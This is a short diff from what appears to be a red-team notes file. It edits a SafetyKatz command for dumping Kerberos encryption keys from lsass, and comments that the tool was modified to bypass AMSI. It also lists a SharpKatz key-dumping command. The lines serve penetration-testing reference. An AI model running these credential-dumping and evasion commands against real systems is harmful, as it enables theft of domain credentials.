@@ -27,7 +27,7 @@ Therefore, it possible to dump Kerberos encryption keys using `sekurlsa::ekeys`.
 
 # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
 # Used evasive-keys to bypass ASMI and has been edited in the source code
-SafetyKatz.exe "sekurlsa::ekeys" 
+SafetyKatz.exe "sekurlsa::evasive-keys" 
 
 # Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
 SharpKatz.exe --Command ekeys
